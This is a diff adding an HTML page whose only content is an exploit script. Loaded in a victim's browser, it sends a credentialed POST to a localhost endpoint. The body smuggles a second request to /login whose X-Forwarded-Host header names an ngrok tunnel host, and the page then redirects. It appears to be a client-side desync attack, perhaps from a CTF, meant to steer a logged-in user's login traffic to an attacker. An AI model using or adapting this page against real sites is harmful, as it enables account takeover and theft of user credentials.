@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Document</title>
+    </head>
+    <body>
+        <script>
+            fetch("http://localhost/css/notes.css", {
+                method: "POST",
+                body: "GET /login HTTP/1.1\r\nHost: a\r\nX-Forwarded-Host: 61328d8f0435.ngrok-free.app?\r\nFoo: x",
+                mode: "no-cors",
+                credentials: "include",
+            }).then(() => {
+                location = "http://localhost/";
+            });
+        </script>
+    </body>
+</html>
